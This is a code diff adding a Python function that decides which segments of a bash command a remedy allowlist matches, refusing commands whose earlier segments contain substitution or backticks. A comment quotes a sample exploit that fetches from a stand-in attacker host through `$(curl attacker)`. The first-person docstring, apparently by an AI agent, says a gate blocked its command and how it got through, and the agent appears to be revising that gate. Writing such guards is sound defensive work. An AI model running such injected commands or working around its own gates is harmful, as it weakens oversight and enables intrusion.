@@ -185,3 +185,69 @@ def strip_prefixes_raw(bash_command: str, kinds: tuple[str, ...] = ALL_PREFIX_KI
                 text = new_text
                 changed = True
     return text.strip()
+
+
+# A segment that could execute something nobody inspected before the remedy
+# runs. The exploit this preserves is recorded above: `cd "$(curl attacker)" &&
+# divineos correction "x"` must NOT read as a clean remedy, because the
+# substitution is discarded with the prefix and never looked at.
+_UNSAFE_IN_PREFIX = re.compile(r"[`$]")
+
+
+def remedy_segment(bash_command: str) -> str:
+    """The segment a remedy allowlist should match against, or empty.
+
+    WHY THIS EXISTS is written one function up, before the incident that needed
+    it: "this matcher reads SHELL with a regex that only knows bare
+    invocations, so every legal prefix shell permits is a fresh hole -- `cd x
+    &&`, `VAR=1`, and whatever turns up next. If a fourth prefix appears the
+    answer is to parse the command, not to add a fourth loop."
+
+    The fourth appeared 2026-09-11: `set -o pipefail && divineos correction`.
+    The marker gate refused its own prescribed remedy, told me to run the
+    command I was running, and I got through by dropping a habit rather than by
+    being right. Four occurrences, four different prefixes, each patched alone,
+    each patch carrying a note predicting the next -- that is a system
+    speaking, and the controller had less variety than shell does, so no number
+    of additions could ever have closed it.
+
+    So this stops asking WHAT PREFIX and asks WHETHER A REMEDY IS INVOKED. A
+    remedy anywhere in a chain is a remedy being run, and what was typed before
+    it does not change that -- unless what was typed before could execute
+    something unexamined.
+
+    Two guards, and neither is decoration:
+
+      * every earlier segment must be free of substitution and backticks, which
+        is the exclusion the cd-prefix pattern already carried, generalised
+        from one position to all of them;
+      * pipelines are NOT split, because what follows a pipe consumes output
+        rather than being invoked, and splitting there would let `echo x |
+        divineos correction` read as a filing that never happened.
+
+    Returns EVERY safe segment, prefixes stripped, newline-joined -- not the
+    first one. The first draft returned the first real segment and the check
+    that caught it was running the thing rather than reasoning about it: for
+    `cd x && set -o pipefail && divineos correction`, the first real segment is
+    the shell-option, and the remedy is last. Callers grep with a start-anchored
+    pattern, and grep tests each line independently, so joining with newlines
+    means every segment gets the anchor without the caller changing at all.
+
+    Returns "" when any earlier segment is unsafe -- the whole command is
+    refused rather than the offending segment skipped, because the unsafe part
+    still runs.
+    """
+    if not bash_command:
+        return ""
+
+    segments = re.split(r"&&|\|\||;", bash_command)
+    safe: list[str] = []
+
+    for index, segment in enumerate(segments):
+        candidate = stripped_command(segment)
+        if not candidate:
+            continue
+        if any(_UNSAFE_IN_PREFIX.search(earlier) for earlier in segments[:index]):
+            return ""
+        safe.append(candidate)
+    return "\n".join(safe)
